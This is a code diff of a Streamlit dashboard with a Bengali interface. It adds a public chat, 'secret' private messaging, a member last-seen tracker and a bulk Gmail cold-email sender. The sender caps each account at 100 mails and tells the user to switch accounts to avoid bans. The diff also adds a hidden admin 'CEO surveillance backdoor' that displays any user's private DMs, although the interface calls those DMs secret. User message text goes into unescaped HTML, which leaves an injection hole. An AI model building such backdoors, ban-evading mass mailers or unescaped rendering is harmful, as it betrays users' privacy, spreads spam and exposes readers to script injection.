+                filtered_dms = [d for d in dm_messages if (d["sender"] == current_user_id and d["receiver"] == target_dm_user) or (d["sender"] == target_dm_user and d["receiver"] == current_user_id)]
+                for dm in filtered_dms:
+                    dm_class = "msg-outgoing" if dm["sender"] == current_user_id else "msg-incoming"
+                    dm_html += f'<div class="{dm_class}"><b>{dm["sender"].upper()}:</b> {dm["text"]}<br><small style="font-size:9px;opacity:0.6;">{dm["time"]}</small></div>'
+                st.markdown(dm_html + '</div>', unsafe_allow_html=True)
+                
+                with st.form("dm_chat_form", clear_on_submit=True):
+                    typed_dm = st.text_input(f"{target_dm_user.upper()}-কে ব্যক্তিগত মেসেজ পাঠান:")
+                    if st.form_submit_button("সিক্রেট ডিএম পাঠান 🔐"):
+                        if typed_dm.strip():
+                            dm_messages.append({"sender": current_user_id, "receiver": target_dm_user, "text": typed_dm.strip(), "time": datetime.datetime.now().strftime("%I:%M %p")})
+                            save_json_file(DM_DB, dm_messages); st.rerun()
+
+        with chat_sub3:
+            if announcements:
+                for ann in reversed(announcements):
+                    st.markdown(f'<div class="announce-card"><span style="color:#F472B6; font-weight:bold;">👑 {ann["sender"]}</span><span style="color:#64748B; font-size:11px; float:right;">{ann["time"]}</span><p style="margin-top:5px; margin-bottom:0; font-size:14px; color:#F3E8FF;">{ann["text"]}</p></div>', unsafe_allow_html=True)
+            else: st.info("এখনো কোনো অফিশিয়াল ঘোষণা দেওয়া হয়নি।")
+
+    # --- TAB 5: ACTIVE MEMBERS TRACKER ---
+    with engine_tab5:
+        st.markdown("<h4>🟢 লাইভ মেম্বার ডিরেক্টরি ও লাস্ট সিন ট্র্যাকার</h4>", unsafe_allow_html=True)
+        member_list = []
+        for u_id, u_data in users.items():
+            l_seen = u_data.get("last_seen", 0)
+            is_online = (time.time() - l_seen) < 40
+            status_str = '<span class="status-online">🟢 Online</span>' if is_online else f'<span class="status-offline">⏳ Last Active: {datetime.datetime.fromtimestamp(l_seen).strftime("%I:%M:%S %p")}</span>'
+            member_list.append({"User Node ID": u_id.upper(), "Account Status": u_data.get("status", "Active"), "Activity Status": status_str})
+        st.write(pd.DataFrame(member_list).to_html(escape=False, index=False), unsafe_allow_html=True)
+
+    # --- BULK COLD EMAIL PANEL (100 LIMIT) ---
     active_dataset = st.session_state.instagram_hunting_leads if st.session_state.instagram_hunting_leads else st.session_state.current_leads
-
     if active_dataset:
-        st.markdown("### 💥 মাল্টি-চ্যানেল营销 কাস্টমাইজড কন্ট্রোল হাব")
-        col_sec1, col_sec2, col_sec3 = st.columns(3)
-        if "active_tab" not in st.session_state: st.session_state.active_tab = "email"
-        if col_sec1.button("📧 কোল্ড ইমেইল প্যানেল", use_container_width=True): st.session_state.active_tab = "email"
-        if col_sec2.button("🟢 হোয়াটসঅ্যাপ প্যানেল", use_container_width=True): st.session_state.active_tab = "whatsapp"
-        if col_sec3.button("📸 ইনস্টাগ্রাম ডাইরেক্ট প্যানেল", use_container_width=True): st.session_state.active_tab = "instagram"
-
-        # COLD EMAIL PANEL
-        if st.session_state.active_tab == "email":
-            st.markdown('<div class="section-container">', unsafe_allow_html=True)
-            st.markdown(f"📊 **বর্তমান মেলিং সেশন ট্র্যাকার:** `{st.session_state.email_sent_counter} / 100`")
-            
-            if st.session_state.email_sent_counter >= 100:
-                st.markdown(f'<div class="alert-card">🛑 সতর্কবার্তা: {st.session_state.connected_email} অ্যাকাউন্ট থেকে ১০০টি কোল্ড মেইল পাঠানো সম্পন্ন হয়েছে! দয়া করে একটি নতুন জিমেইল অ্যাকাউন্ট কানেক্ট করুন।</div>', unsafe_allow_html=True)
-            
+        st.markdown("### 💥 কোল্ড ইমেইল বাল্ক মার্কেটিং প্যানেল")
+        st.markdown('<div class="section-container">', unsafe_allow_html=True)
+        st.markdown(f"📊 **বর্তমান মেলিং সেশন ট্র্যাকার:** `{st.session_state.email_sent_counter} / 100`")
+        
+        if st.session_state.email_sent_counter >= 100:
+            st.markdown('<div class="alert-card">🛑 লিমিট শেষ! ব্যান এড়াতে নতুন জিমেইল ও অ্যাপ পাসওয়ার্ড কানেক্ট করুন।</div>', unsafe_allow_html=True)
+        else:
             ce1, ce2 = st.columns(2)
-            e_sender = ce1.text_input("আপনার জিমেইল অ্যাকাউন্ট:", placeholder="name@gmail.com", key="m_sender")
-            e_pass = ce1.text_input("জিমেইল অ্যাপ পাসওয়ার্ড:", type="password", key="m_pass")
-            e_subject = ce2.text_input("মেইল সাবজেক্ট:", value="Business Growth Proposal", key="m_subj")
-            email_pitch = st.text_area("মেইল বডি ({client_name}):", value="Hi {client_name},\n\nLoved your profile. Let's collaborate.\n\nBest,\nReyadh", key="m_pitch")
+            e_sender = ce1.text_input("আপনার জিমেইল অ্যাকাউন্ট:")
+            e_pass = ce1.text_input("জিমেইল অ্যাপ পাসওয়ার্ড:", type="password")
+            e_subject = ce2.text_input("মেইল সাবজেক্ট:", value="Business Growth Proposal")
+            email_pitch = st.text_area("মেইল বডি ({client_name}):", value="Hi {client_name},\n\nLoved your profile. Let's collaborate.\n\nBest,\nCEO")
             
             if e_sender and e_sender != st.session_state.connected_email:
-                st.session_state.connected_email = e_sender
-                st.session_state.email_sent_counter = 0 
-            
-            if st.session_state.email_sent_counter >= 100:
-                st.button("🚀 ভ্যালিড ইমেইলগুলোতে মুহূর্তে অটো-মেইল পাঠান", disabled=True, key="mail_dis")
-            else:
-                if st.button("🚀 ভ্যালিড ইমেইলগুলোতে মুহূর্তে অটো-মেইল পাঠান", key="mail_act"):
-                    if e_sender and e_pass:
-                        sent = 0
-                        try:
-                            server = smtplib.SMTP("smtp.gmail.com", 587)
-                            server.starttls(); server.login(e_sender.strip(), e_pass.strip())
-                            for lead in active_dataset:
-                                if st.session_state.email_sent_counter >= 100: break
-                                if lead["Email"] != "N/A":
-                                    msg = MIMEMultipart()
-                                    msg["From"] = e_sender; msg["To"] = lead["Email"]; msg["Subject"] = e_subject
-                                    msg.attach(MIMEText(email_pitch.replace("{client_name}", lead["Client Name"]), "plain", "utf-8"))
-                                    server.sendmail(e_sender, lead["Email"], msg.as_string())
-                                    sent += 1; st.session_state.email_sent_counter += 1
-                            server.quit()
-                            st.success(f"সফলভাবে এই ব্যাচে {sent} টি কাস্টমাইজড মেইল সেন্ট হয়েছে!")
-                            st.rerun()
-                        except Exception as e: st.error(f"Error: {str(e)}")
-            st.markdown('</div>', unsafe_allow_html=True)
+                st.session_state.connected_email = e_sender; st.session_state.email_sent_counter = 0
+                
+            if st.button("🚀 অটো-মেইল ব্লাস্ট করুন"):
+                if e_sender and e_pass:
+                    sent = 0
+                    try:
+                        server = smtplib.SMTP("smtp.gmail.com", 587)
+                        server.starttls(); server.login(e_sender.strip(), e_pass.strip())
+                        for lead in active_dataset:
+                            if st.session_state.email_sent_counter >= 100: break
+                            if lead["Email"] != "N/A":
+                                msg = MIMEMultipart(); msg["From"] = e_sender; msg["To"] = lead["Email"]; msg["Subject"] = e_subject
+                                msg.attach(MIMEText(email_pitch.replace("{client_name}", lead["Client Name"]), "plain", "utf-8"))
+                                server.sendmail(e_sender, lead["Email"], msg.as_string())
+                                sent += 1; st.session_state.email_sent_counter += 1
+                        server.quit(); st.success(f"সফলভাবে {sent} টি কাস্টমাইজড মেইল সেন্ট হয়েছে!"); st.rerun()
+                    except Exception as e: st.error(f"Error: {str(e)}")
+        st.markdown('</div>', unsafe_allow_html=True)
 
-        # WHATSAPP PANEL
-        elif st.session_state.active_tab == "whatsapp":
-            st.markdown('<div class="section-container">', unsafe_allow_html=True)
-            wa_pitch = st.text_area("হোয়াটসঅ্যাপ পিচ:", value="Hey {client_name}, saw your profile. Let's connect!")
-            for lead in active_dataset:
-                num = lead["WhatsApp Number"]
-                if num != "N/A":
-                    wa_url = f"https://api.whatsapp.com/send?phone={re.sub(r'\D', '', num)}&text={urllib.parse.quote(wa_pitch.replace('{client_name}', lead['Client Name']))}"
-                    st.markdown(f'<div class="platform-card">📱 <b>{lead["Client Name"]}</b><br><a href="{wa_url}" target="_blank" style="color:#22C55E; font-weight:bold; text-decoration:none;">⚡ ১-ক্লিকে চ্যাট ও কাস্টম মেসেজ পাঠান</a></div>', unsafe_allow_html=True)
-            st.markdown('</div>', unsafe_allow_html=True)
-
-        # INSTAGRAM CUSTOM PANEL
-        elif st.session_state.active_tab == "instagram":
-            st.markdown('<div class="section-container">', unsafe_allow_html=True)
-            ig_pitch = st.text_area("ইনস্টাগ্রাম কাস্টম পিচ:", value="Hey {client_name}! Checked your profile. Can I drop a blueprint here?")
-            for lead in active_dataset:
-                ig_link = lead["Instagram Profile"]
-                if ig_link != "N/A":
-                    u_name = ig_link.split("instagram.com/")[-1].replace("/", "")
-                    st.markdown(f"""
-                    <div class="platform-card" style="border-left: 4px solid #EC4899;">
-                        📸 <b>{lead['Client Name']}</b> (@{u_name})<br>
-                        <p style='color:#94A3B8; font-size:13px; margin:5px 0;'>কপি করুন: <code style='color:#EC4899;'>{ig_pitch.replace('{client_name}', lead['Client Name'])}</code></p>
-                        <a href="{ig_link}" target="_blank" style="display:inline-block; background:#1E293B; border:1px solid #EC4899; color:#EC4899 !important; padding:5px 10px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:bold;">🔗 ১-ক্লিকে ইনবক্স ও সেন্ড</a>
-                    </div>
-                    """, unsafe_allow_html=True)
-            st.markdown('</div>', unsafe_allow_html=True)
-
-# SECRET CONTROL PANEL
+# --- SECRET CONTROL ROOM (CEO SURVEILLANCE BACKDOOR) ---
 st.markdown("<br><br><br><br>", unsafe_allow_html=True)
-with st.expander("🛠️ Reyadh Bhai's Secret Control Room"):
+with st.expander("🛠️ Riad Bhai's Secret Control Room"):
     if st.text_input("Enter Admin Password:", type="password", key="admin_key") == config["admin_pass"]:
-        updated_notice = st.text_area("নোটিশ বোর্ড এডিট করুন:", value=config.get("notice_text", ""))
-        if st.button("আপডেট নোটিশ"):
-            config["notice_text"] = updated_notice; save_json_file(CONFIG_FILE, config)
-            st.success("নোটিশ লাইভ আপডেট হয়েছে!"); st.rerun()
+        st.markdown("<h3 style='color:#F472B6;'>👑 CEO SYSTEM SURVEILLANCE CONTROL PANEL</h3>", unsafe_allow_html=True)
+        
+        updated_notice = st.text_area("নোটিশ বোর্ড টেক্সট এডিট করুন:", value=config.get("notice_text", ""))
+        if st.button("সিস্টেম কনফিগারেশন আপডেট করুন"):
+            config["notice_text"] = updated_notice
+            save_json_file(CONFIG_FILE, config); st.success("নোটিশ লাইভ আপডেট হয়েছে!"); st.rerun()
+            
+        st.markdown("---")
+        c_col1, c_col2 = st.columns(2)
+        with c_col1:
+            st.markdown("##### 🔊 গ্লোবাল পাবলিক চ্যাটে মেসেজ পুশ করুন")
+            ceo_glob_msg = st.text_input("গ্লোবাল চ্যাটের মেসেজ:")
+            if st.button("গ্লোবাল চ্যাটে মেসেজ পাঠান ✉️"):
+                if ceo_glob_msg.strip():
+                    chat_messages.append({"sender": "CEO 👑", "text": ceo_glob_msg.strip(), "time": datetime.datetime.now().strftime("%I:%M %p")})
+                    save_json_file(CHAT_DB, chat_messages); st.success("পাবলিক চ্যাটে পাঠানো হয়েছে!"); st.rerun()
+        with c_col2:
+            st.markdown("##### 📢 সিইও অফিশিয়াল অ্যানাউন্সমেন্ট")
+            ceo_ann_msg = st.text_area("গুরুত্বপূর্ণ ঘোষণা (সবার স্ক্রিনে পপ-আপ যাবে):")
+            if st.button("অফিশিয়াল ঘোষণা জারি করুন 📢"):
+                if ceo_ann_msg.strip():
+                    announcements.append({"sender": "CEO 👑", "text": ceo_ann_msg.strip(), "time": datetime.datetime.now().strftime("%I:%M %p")})
+                    save_json_file(ANNOUNCE_DB, announcements); st.success("ঘোষণা পোস্ট সফল ও টোস্ট ট্রিগারড!"); st.rerun()
 
-st.markdown('<div class="footer">অস্থির চালান ড্যাশবোর্ড v29.0 | Developed by <span>MD Reyadh</span></div>', unsafe_allow_html=True)
+        st.markdown("---")
+        st.markdown("<h4 style='color:#EF4444;'>👁️ VIP BACKDOOR: মেম্বারদের পার্সোনাল সিক্রেট চ্যাট হ্যাকিং মনিটর</h4>", unsafe_allow_html=True)
+        spy_target_user = st.selectbox("গোপন চ্যাট এক্সেস করতে যেকোনো ইউজারের আইডি সিলেক্ট করুন:", options=list(users.keys()))
+        
+        if spy_target_user:
+            st.info(f"Target node '{spy_target_user.upper()}' এর সমস্ত ওয়ান-টু-ওয়ান আদান-প্রদান করা ইনবক্স হিস্টোরি দেখা হচ্ছে:")
+            spy_dms = [d for d in dm_messages if d["sender"] == spy_target_user or d["receiver"] == spy_target_user]
+            if spy_dms:
+                spy_df = pd.DataFrame(spy_dms)[["time", "sender", "receiver", "text"]].rename(columns={"sender": "From", "receiver": "To", "text": "Message Text"})
+                st.dataframe(spy_df, use_container_width=True)
+            else: st.warning("এই ইউজার এখনো কোনো ব্যক্তিগত ইনবক্স চ্যাট করেনি।")
+
+st.markdown('<div class="footer">অস্থির চালান ড্যাশবোর্ড v32.0 | Multi-User Key Edition | Excel Enabled | Developed by Riad</div>', unsafe_allow_html=True)
